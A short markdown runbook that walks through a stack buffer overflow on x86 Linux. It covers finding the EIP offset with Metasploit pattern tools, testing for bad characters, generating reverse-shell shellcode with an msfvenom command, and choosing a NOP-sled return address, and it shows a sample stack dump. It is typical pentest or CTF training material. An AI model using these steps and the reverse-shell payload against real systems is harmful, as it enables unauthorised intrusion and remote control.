# buffer overflow x86 linux

## Step 1: Take control EIP

- Get rough estimate offset (e.g. 1000)
- Create pattern.
```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200
```

- Calculate exact offset using the value of the EIP.
```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
```

- Verify offset by overwriting EIP.

## Step 2: Identify bad chars

- Start inspecting bad characters "\x00\x01\x02...\xff"
- Use the following command to inspect the stack.

```shell
x/1000xb $rsp
```

- Iterate the process. E.g. remove "\x00\x09", update input, and rerun program.

## Step 3: Generate shellcode

Consider
- Architecture (e.g. `x86`)
- Platform (e.g. linux)
- Bad characters

Generate shellcode using `msfvenom`.
```shell
msfvenom -p "linux/x86/shell_reverse_tcp" LHOST=127.0.0.1 LPORT=4444 --format "c" --bad-chars "\x00\x09\x0a\x20"
```

- Update program input. Add `\x90` chars are NOP instructions.

- Example stack is given below.

```shell
...
0xffffd6b4:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6bc:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6c4:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd6cc:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
...
0xffffd72c:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd734:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd73c:     0xbf    0x0c    0xf4    0xbb    0x7c    0xd9    0xcb    0xd9
0xffffd744:     0x74    0x24    0xf4    0x5a    0x31    0xc9    0xb1    0x12
...
```

## Step 4: Identify return address

- Get a memory address where **only** NOPs are located to tell the EIP to jump to it.
- This memory address must **not** contain any of the bad characters we found earlier.
- Pass the address to the input **backwards** in case of little Endian

Finally, update the EIP overwrite with the memory address found above.

## Python
- A Python script for buffer overflow can be at [GitHub](https://github.com/a3cipher/runbook/blob/main/ptes3-exploitation/binary-exploitation/bo-x86-linux-local.py).
